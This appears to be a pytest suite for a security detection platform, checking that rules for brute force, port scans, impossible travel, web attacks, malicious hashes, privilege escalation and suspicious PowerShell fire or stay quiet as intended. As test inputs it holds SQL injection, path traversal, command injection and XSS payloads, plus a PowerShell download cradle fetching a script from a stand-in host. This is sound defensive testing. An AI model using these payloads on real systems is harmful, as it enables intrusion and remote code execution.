"""Detection rule behaviour.

Each rule is tested for three things: it fires when it should, it stays quiet
when it should not, and its threshold is actually honoured. A rule that only
has a positive test is a rule that might fire on everything.

Events go through the real ingest pipeline, so these also cover normalization
and alert creation.
"""

from __future__ import annotations

from datetime import timedelta
from typing import ClassVar

import pytest
from sqlalchemy import select

from app.models.alert import Alert
from app.models.audit import IOCWatchlistEntry
from app.schemas.event import RawEventIn
from app.services.ingest import ingest_events
from tests import factories


def send(db, raw_events: list[dict]):
    return ingest_events(db, [RawEventIn(**e) for e in raw_events])


def alerts_for(db, rule_key: str) -> list[Alert]:
    return list(
        db.execute(select(Alert).where(Alert.rule_key == rule_key)).scalars().all()
    )


# ------------------------------------------------------------- brute force
class TestBruteForce:
    KEY = "brute_force_authentication"

    def test_fires_above_threshold(self, seeded_rules):
        db = seeded_rules
        send(db, [factories.failed_login("203.0.113.10", "jdoe") for _ in range(10)])
        alerts = alerts_for(db, self.KEY)
        assert len(alerts) == 1
        assert alerts[0].src_ip == "203.0.113.10"
        assert alerts[0].severity == "high"
        assert alerts[0].event_count == 10
        assert alerts[0].mitre_technique_id == "T1110"

    def test_silent_below_threshold(self, seeded_rules):
        db = seeded_rules
        send(db, [factories.failed_login("203.0.113.11", "jdoe") for _ in range(4)])
        assert alerts_for(db, self.KEY) == []

    def test_successful_logins_do_not_count(self, seeded_rules):
        db = seeded_rules
        send(db, [factories.successful_login("203.0.113.12", "jdoe") for _ in range(20)])
        assert alerts_for(db, self.KEY) == []

    def test_failures_from_different_sources_do_not_aggregate(self, seeded_rules):
        """Ten users each mistyping once is not an attack."""
        db = seeded_rules
        send(db, [factories.failed_login(f"198.51.100.{i}", "jdoe") for i in range(1, 11)])
        assert alerts_for(db, self.KEY) == []

    def test_password_spray_escalates_severity(self, seeded_rules):
        db = seeded_rules
        send(db, [
            factories.failed_login("203.0.113.13", f"user{i}") for i in range(10)
        ])
        alert = alerts_for(db, self.KEY)[0]
        assert alert.severity == "critical"
        assert "spraying" in alert.title.lower()

    def test_repeated_batches_deduplicate_into_one_alert(self, seeded_rules):
        """A sustained attack must not produce one alert per ingest call."""
        db = seeded_rules
        send(db, [factories.failed_login("203.0.113.14", "jdoe") for _ in range(10)])
        send(db, [factories.failed_login("203.0.113.14", "jdoe") for _ in range(10)])
        alerts = alerts_for(db, self.KEY)
        assert len(alerts) == 1
        assert alerts[0].event_count == 20

    def test_threshold_is_configurable(self, seeded_rules):
        from app.models.detection import DetectionRule as RuleModel

        db = seeded_rules
        rule = db.execute(select(RuleModel).where(RuleModel.rule_key == self.KEY)).scalar_one()
        rule.config = {"threshold": 3, "window_minutes": 5, "spray_account_threshold": 5}
        db.commit()
        send(db, [factories.failed_login("203.0.113.15", "jdoe") for _ in range(3)])
        assert len(alerts_for(db, self.KEY)) == 1

    def test_disabled_rule_does_not_fire(self, seeded_rules):
        from app.models.detection import DetectionRule as RuleModel

        db = seeded_rules
        rule = db.execute(select(RuleModel).where(RuleModel.rule_key == self.KEY)).scalar_one()
        rule.enabled = False
        db.commit()
        send(db, [factories.failed_login("203.0.113.16", "jdoe") for _ in range(20)])
        assert alerts_for(db, self.KEY) == []


# ---------------------------------------------------------------- port scan
class TestPortScan:
    KEY = "port_scan"

    def test_vertical_scan_fires(self, seeded_rules):
        db = seeded_rules
        send(db, [
            factories.connection("203.0.113.20", "10.20.0.5", port)
            for port in range(20, 40)
        ])
        alerts = alerts_for(db, self.KEY)
        assert len(alerts) == 1
        assert alerts[0].mitre_technique_id == "T1046"
        assert alerts[0].evidence["distinct_ports"] == 20
        assert alerts[0].evidence["distinct_hosts"] == 1

    def test_horizontal_scan_fires(self, seeded_rules):
        db = seeded_rules
        send(db, [
            factories.connection("203.0.113.21", f"10.20.0.{host}", 445)
            for host in range(1, 15)
        ])
        assert len(alerts_for(db, self.KEY)) == 1

    def test_normal_traffic_stays_quiet(self, seeded_rules):
        db = seeded_rules
        send(db, [
            factories.connection("10.0.0.50", "10.20.0.5", 443) for _ in range(30)
        ])
        assert alerts_for(db, self.KEY) == []

    def test_few_ports_do_not_fire(self, seeded_rules):
        db = seeded_rules
        send(db, [
            factories.connection("10.0.0.51", "10.20.0.5", p) for p in (80, 443, 8080)
        ])
        assert alerts_for(db, self.KEY) == []


# ------------------------------------------------------ suspicious login
class TestSuspiciousLogin:
    KEY = "suspicious_login_after_failures"

    def test_success_after_failures_fires(self, seeded_rules):
        db = seeded_rules
        base = factories.now() - timedelta(minutes=2)
        send(db, [
            factories.failed_login("203.0.113.30", "jdoe", at=base + timedelta(seconds=i))
            for i in range(6)
        ])
        send(db, [factories.successful_login("203.0.113.30", "jdoe")])
        alerts = alerts_for(db, self.KEY)
        assert len(alerts) == 1
        assert alerts[0].severity == "critical"
        assert alerts[0].username == "jdoe"

    def test_success_from_a_different_source_is_lower_severity(self, seeded_rules):
        db = seeded_rules
        base = factories.now() - timedelta(minutes=2)
        send(db, [
            factories.failed_login("203.0.113.31", "asmith", at=base + timedelta(seconds=i))
            for i in range(6)
        ])
        send(db, [factories.successful_login("10.0.0.99", "asmith")])
        alert = alerts_for(db, self.KEY)[0]
        assert alert.severity == "high"

    def test_clean_login_does_not_fire(self, seeded_rules):
        db = seeded_rules
        send(db, [factories.successful_login("10.0.0.60", "bwilliams")])
        assert alerts_for(db, self.KEY) == []

    def test_one_typo_then_success_does_not_fire(self, seeded_rules):
        """The everyday case must not alert, or analysts stop reading alerts."""
        db = seeded_rules
        send(db, [factories.failed_login("10.0.0.61", "ctaylor")])
        send(db, [factories.successful_login("10.0.0.61", "ctaylor")])
        assert alerts_for(db, self.KEY) == []


# ---------------------------------------------------------- impossible travel
class TestImpossibleTravel:
    KEY = "impossible_travel"

    LONDON: ClassVar[dict] = {"lat": 51.5074, "lon": -0.1278, "city": "London", "country": "GB"}
    SYDNEY: ClassVar[dict] = {"lat": -33.8688, "lon": 151.2093, "city": "Sydney", "country": "AU"}
    OXFORD: ClassVar[dict] = {"lat": 51.7520, "lon": -1.2577, "city": "Oxford", "country": "GB"}

    def test_fires_on_geographically_impossible_pair(self, seeded_rules):
        db = seeded_rules
        earlier = factories.now() - timedelta(hours=1)
        send(db, [factories.successful_login("198.51.100.20", "dclark", at=earlier, geo=self.LONDON)])
        send(db, [factories.successful_login("203.0.113.40", "dclark", geo=self.SYDNEY)])
        alerts = alerts_for(db, self.KEY)
        assert len(alerts) == 1
        assert alerts[0].username == "dclark"
        assert alerts[0].mitre_technique_id == "T1078"

    def test_plausible_travel_does_not_fire(self, seeded_rules):
        """London to Sydney in 30 hours is a long flight, not an impossibility."""
        db = seeded_rules
        earlier = factories.now() - timedelta(hours=30)
        send(db, [factories.successful_login("198.51.100.21", "efoster", at=earlier, geo=self.LONDON)])
        send(db, [factories.successful_login("203.0.113.41", "efoster", geo=self.SYDNEY)])
        assert alerts_for(db, self.KEY) == []

    def test_nearby_cities_do_not_fire(self, seeded_rules):
        """Below the distance floor, geolocation error dominates."""
        db = seeded_rules
        earlier = factories.now() - timedelta(minutes=5)
        send(db, [factories.successful_login("198.51.100.22", "ggreen", at=earlier, geo=self.LONDON)])
        send(db, [factories.successful_login("198.51.100.23", "ggreen", geo=self.OXFORD)])
        assert alerts_for(db, self.KEY) == []

    def test_different_users_are_not_correlated(self, seeded_rules):
        db = seeded_rules
        earlier = factories.now() - timedelta(hours=1)
        send(db, [factories.successful_login("198.51.100.24", "user_a", at=earlier, geo=self.LONDON)])
        send(db, [factories.successful_login("203.0.113.42", "user_b", geo=self.SYDNEY)])
        assert alerts_for(db, self.KEY) == []


# ------------------------------------------------------------- web attacks
class TestWebAttack:
    KEY = "web_attack_indicators"

    @pytest.mark.parametrize(
        "path,category",
        [
            ("/products?id=1' UNION SELECT username,password FROM users--", "sql_injection"),
            ("/api?q=1 OR 1=1", "sql_injection"),
            ("/download?file=../../../../etc/passwd", "path_traversal"),
            ("/ping?host=127.0.0.1;cat /etc/passwd", "command_injection"),
            ("/search?q=<script>alert(1)</script>", "xss"),
            ("/page?tpl=php://filter/convert.base64-encode/resource=index", "file_inclusion"),
        ],
    )
    def test_hostile_paths_fire(self, seeded_rules, path, category):
        db = seeded_rules
        send(db, [factories.http_request("203.0.113.50", path)])
        alerts = alerts_for(db, self.KEY)
        assert len(alerts) == 1, f"no alert for {category}: {path}"
        assert category in alerts[0].evidence["categories"], (
            f"expected {category}, got {alerts[0].evidence['categories']}"
        )

    def test_double_encoded_traversal_is_caught(self, seeded_rules):
        """Attackers double-encode precisely to defeat single-pass decoding."""
        db = seeded_rules
        send(db, [factories.http_request("203.0.113.51", "/get?f=%252e%252e%252f%252e%252e%252fetc%252fpasswd")])
        assert len(alerts_for(db, self.KEY)) == 1

    @pytest.mark.parametrize(
        "path",
        [
            "/products?id=12345",
            "/articles/how-to-select-a-union-representative",
            "/search?q=script+writing+tips",
            "/api/v1/users?page=2&sort=name",
            "/downloads/report-2026.pdf",
        ],
    )
    def test_benign_paths_stay_quiet(self, seeded_rules, path):
        """False positives here would bury the real ones."""
        db = seeded_rules
        send(db, [factories.http_request("10.0.0.70", path)])
        assert alerts_for(db, self.KEY) == [], f"false positive on: {path}"


# ---------------------------------------------------------- malicious hash
class TestMaliciousHash:
    KEY = "malicious_file_hash"
    BAD = "3f786850e387550fdab836ed7e6dc881de23001b3f786850e387550fdab836ed"

    @pytest.fixture(autouse=True)
    def _watchlist(self, seeded_rules):
        seeded_rules.add(
            IOCWatchlistEntry(
                ioc_type="file_hash", value=self.BAD,
                description="SIMULATED test indicator", active=True,
            )
        )
        seeded_rules.commit()

    def test_watchlisted_hash_fires(self, seeded_rules):
        db = seeded_rules
        send(db, [factories.process_execution("WKS-01", "jdoe", "loader.exe", "loader.exe -q", file_hash=self.BAD)])
        alerts = alerts_for(db, self.KEY)
        assert len(alerts) == 1
        assert alerts[0].severity == "critical"
        assert alerts[0].hostname == "WKS-01"

    def test_unknown_hash_stays_quiet(self, seeded_rules):
        db = seeded_rules
        send(db, [factories.process_execution("WKS-02", "jdoe", "notepad.exe", "notepad.exe", file_hash="b" * 64)])
        assert alerts_for(db, self.KEY) == []

    def test_deactivated_indicator_stops_firing(self, seeded_rules):
        db = seeded_rules
        entry = db.execute(select(IOCWatchlistEntry).where(IOCWatchlistEntry.value == self.BAD)).scalar_one()
        entry.active = False
        db.commit()
        send(db, [factories.process_execution("WKS-03", "jdoe", "loader.exe", "loader.exe", file_hash=self.BAD)])
        assert alerts_for(db, self.KEY) == []


# ------------------------------------------------------ privilege escalation
class TestPrivilegeEscalation:
    KEY = "privilege_escalation"

    def test_sensitive_group_addition_is_critical(self, seeded_rules):
        db = seeded_rules
        send(db, [factories.privilege_change("DC-01", "temp_contractor", "Domain Admins")])
        alerts = alerts_for(db, self.KEY)
        assert len(alerts) == 1
        assert alerts[0].severity == "critical"
        assert alerts[0].mitre_technique_id == "T1548"

    def test_ordinary_group_is_medium(self, seeded_rules):
        db = seeded_rules
        send(db, [factories.privilege_change("WKS-10", "jdoe", "Printer Users")])
        assert alerts_for(db, self.KEY)[0].severity == "medium"

    def test_failed_attempt_on_sensitive_group_is_high(self, seeded_rules):
        db = seeded_rules
        send(db, [factories.privilege_change("DC-02", "attacker", "Enterprise Admins", outcome="failure")])
        assert alerts_for(db, self.KEY)[0].severity == "high"

    def test_normal_process_execution_does_not_fire(self, seeded_rules):
        db = seeded_rules
        send(db, [factories.process_execution("WKS-11", "jdoe", "chrome.exe", "chrome.exe --profile")])
        assert alerts_for(db, self.KEY) == []


# ------------------------------------------------------ suspicious powershell
class TestSuspiciousPowerShell:
    KEY = "suspicious_powershell"

    def test_encoded_command_fires(self, seeded_rules):
        db = seeded_rules
        send(db, [factories.process_execution(
            "WKS-20", "jdoe", "powershell.exe",
            "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAA==",
        )])
        alerts = alerts_for(db, self.KEY)
        assert len(alerts) == 1
        assert alerts[0].mitre_technique_id == "T1059.001"

    def test_download_cradle_fires(self, seeded_rules):
        db = seeded_rules
        send(db, [factories.process_execution(
            "WKS-21", "jdoe", "powershell.exe",
            "powershell -c \"IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.5/a.ps1')\"",
        )])
        assert len(alerts_for(db, self.KEY)) == 1

    def test_benign_powershell_stays_quiet(self, seeded_rules):
        """Administrators use PowerShell all day; flagging it all is useless."""
        db = seeded_rules
        send(db, [factories.process_execution(
            "WKS-22", "admin", "powershell.exe", "powershell.exe -Command Get-Service -Name Spooler",
        )])
        assert alerts_for(db, self.KEY) == []

    def test_non_powershell_process_is_ignored(self, seeded_rules):
        db = seeded_rules
        send(db, [factories.process_execution(
            "WKS-23", "jdoe", "cmd.exe", "cmd.exe /c dir",
        )])
        assert alerts_for(db, self.KEY) == []
